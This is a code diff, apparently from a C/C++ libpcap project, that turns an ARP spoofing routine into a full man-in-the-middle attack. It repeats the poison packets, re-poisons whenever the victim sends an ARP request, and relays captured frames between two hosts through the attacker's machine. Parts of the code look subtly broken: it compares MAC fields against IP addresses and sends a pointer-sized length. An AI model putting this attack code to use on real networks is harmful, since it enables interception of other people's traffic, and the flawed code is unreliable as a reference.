@@ -111,9 +111,54 @@ void arp_spoof(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* att
     u_char arp_to_send[42];
     memcpy(arp_to_send, &arp_poison, sizeof(arp_poison));
 
-    //send attack packet
-    if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_to_send))) != 0)
-        fprintf(stderr, "\nSending ARP_Request Failed");
-    else
-        printf("Succeed: Sending ARP_Poison Packet.");
+    //send attack packet 3 times
+    for (int i = 0; i < 3; i++)
+    {
+        if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_to_send))) != 0)
+            fprintf(stderr, "\nSending ARP_Request Failed");
+        else
+            printf("Succeed: Sending ARP_Poison Packet.");
+    }
+}
+
+void convert_relaying_packet(u_char* packet, uint8_t* attacker_mac, uint8_t* target_mac)
+{
+    ethhdr eth_hdr;
+    memcpy(&eth_hdr.h_dest, target_mac, sizeof(eth_hdr.h_dest));
+    memcpy(&eth_hdr.h_source, attacker_mac, sizeof (eth_hdr.h_source));
+    memcpy(packet, &eth_hdr, sizeof(eth_hdr.h_dest) + sizeof(eth_hdr.h_source));
+}
+
+void attack(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* target_MAC, uint8_t* target_IP, uint8_t* attacker_MAC)
+{
+    arp_spoof(fp, sender_MAC, sender_IP, attacker_MAC, target_IP); //1. arp spoofing
+
+    while(true) //2. capturing
+    {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(fp, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+        printf("%u bytes captured\n", header->caplen);
+
+        arp_packet arp_pckt;
+        memcpy(&arp_pckt, packet, sizeof(arp_packet));
+
+        if(arp_pckt.eth_hdr.h_proto == htons(ETH_P_ARP) && arp_pckt.arp_hdr.ea_hdr.ar_op == htons(ARPOP_REQUEST) &&
+                memcmp(&arp_pckt.arp_hdr.arp_tpa, target_IP, 4) == 0)
+        {
+           arp_spoof(fp, sender_MAC, sender_IP, attacker_MAC, target_IP);
+        }
+        else
+        {
+            if ( memcmp(&arp_pckt.eth_hdr.h_source, sender_IP, 4) == 0) //relaying (sender to target)
+                convert_relaying_packet(const_cast<u_char*>(packet), attacker_MAC, target_MAC);
+            else if ( memcmp(&arp_pckt.eth_hdr.h_source, target_IP, 4) == 0) // relaying (target to sender)
+                convert_relaying_packet(const_cast<u_char*>(packet), attacker_MAC, sender_MAC);
+
+            if(pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
+                printf("Failed: Packet relaying.");
+        }
+    }
 }
